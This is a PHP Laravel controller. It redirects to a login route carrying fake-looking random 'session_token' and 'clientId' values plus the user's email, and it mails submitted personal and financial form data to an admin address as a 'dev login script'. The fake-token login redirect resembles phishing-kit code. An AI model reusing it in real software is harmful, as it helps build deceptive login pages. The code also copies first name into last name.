<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Session;

class HomeController extends Controller
{
    public function index() {
        // $url=$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
        // header('location:'.$url);
        // if(isset($_GET['email'])) {
        //         $email = $_GET['email'];          
        //         $praga = rand();
        //         $praga = md5($praga);
        //         return redirect()->route('login', ['clientId'=>$praga, 'session' => $praga,'protectedtoken' =>  $url, 'email' => $email]);                      
        
        // }        
        return view('welcome');
    }

    public function login(Request $req) {
        // dd($req->all());
        $url=$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().$this->random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
        $praga = rand();
        $praga = md5($praga);

        return redirect()->route('login', ['clientId'=>$praga, 'session' => $req->input('session_token'),'session_token' =>  $url, 'email' => $req->input('email')]);                      
    }

    public function random_number(){
        $numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
        $key=array_rand($numbers);
        return $numbers[$key]; 
    }               
    
    // $name =  generateRandomString();
    public function generateRandomString($length = 6) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public function subscribe(Request $req) {
        $data =  array(
            'first_name' => $req->input('firstname'),
            'last_name' => $req->input('firstname'),
            'email' => $req->input('email'),
            'ref_id' => $req->input('refid'),
            'phone' => $req->input('phone'),
            'address' => $req->input('address'),
            'city' => $req->input('city'),
            'state' => $req->input('state'),
            'country' => $req->input('country'),
            'source_of_income' => $req->input('source'),
            'income' => $req->input('income').', 000',
            'age' => $req->input('age'),
            'gender' => $req->input('gender'),
            'contact_option' => $req->input('contact_option')
        );

        DB::table('users')->insert(
          $data 
        );
        $details = [
            'title' => 'Mail from dev login script',
            'body' => $data
        ];
       
        \Mail::to(env('ADMIN_EMAIL'))->send(new \App\Mail\LoginMail($details));

        Session::flash('success', "Thank you");
        return redirect()->back(); 
    }
}
